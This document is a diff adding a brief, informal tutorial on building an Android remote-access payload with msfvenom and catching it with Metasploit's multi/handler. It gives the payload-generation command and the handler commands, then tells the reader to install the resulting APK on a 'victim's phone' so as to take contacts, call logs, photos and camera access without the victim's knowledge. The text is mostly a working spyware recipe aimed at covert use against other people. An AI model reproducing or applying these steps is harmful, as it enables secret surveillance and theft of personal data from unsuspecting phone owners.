@@ -1,0 +1,30 @@
+Metasploit
+
+In this tutorial Im gonna teach you android exploitation using metasploit and msfvenom.
+
+Assuming that you have installed the kali linux .
+Open terminal and type as
+# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.xx.xxx.xx LPORT=4444 R > kali.apk
+
+here you need to find the lhost to find that type
+ifconfig
+you will see ip address as 192.something.something.something
+
+after that open another terminal and type
+
+msfconsole
+
+after that you will see some images in digital format.
+
+msf  > use multi/handler
+msf exploit(handler) > set payload android/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 192.something.something.something
+msf exploit(handler) > set LPORT 4444
+msf exploit(handler) > exploit
+
+Now the apk file (kali.apk) that is kali.apk which is in root you need to install it in victim's phone.
+
+There that is all
+
+After this you will be able to get all the info from your victim's phone to your computer.Without the victim's knowledge
+You can get all the contacts,call log,access the camera, get photos from the gallery and much more.
